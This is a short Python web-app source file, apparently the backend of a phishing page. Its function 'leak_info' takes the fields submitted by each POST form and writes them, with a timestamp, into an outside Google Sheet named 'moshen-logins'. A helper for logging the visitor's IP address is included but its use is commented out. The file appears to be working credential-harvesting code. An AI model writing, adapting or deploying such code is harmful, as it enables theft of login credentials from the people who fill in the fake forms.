import string
from datetime import datetime


def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip


def leak_info(request, client, fields, sheet_name):

    sheet = client.open('moshen-logins')
    sh = sheet.worksheet(sheet_name)
    row = len(sh.get_all_values()) + 1
    last_col = 'A'
    if fields and request.method == 'POST':
        for f, column in zip(fields, string.ascii_uppercase):
            sh.update(column+str(row), request.POST[f])
            last_col = column

    ip_col_index, date_col_index = string.ascii_uppercase.index(last_col) + 1, string.ascii_uppercase.index(last_col) + 2
    ip_col, date_col = string.ascii_uppercase[ip_col_index], string.ascii_uppercase[date_col_index]

    now = datetime.now()
    date_time = now.strftime("%d/%m/%Y, %H:%M:%S")

    # sh.update(ip_col+str(row), get_client_ip(request))
    sh.update(date_col+str(row), date_time)


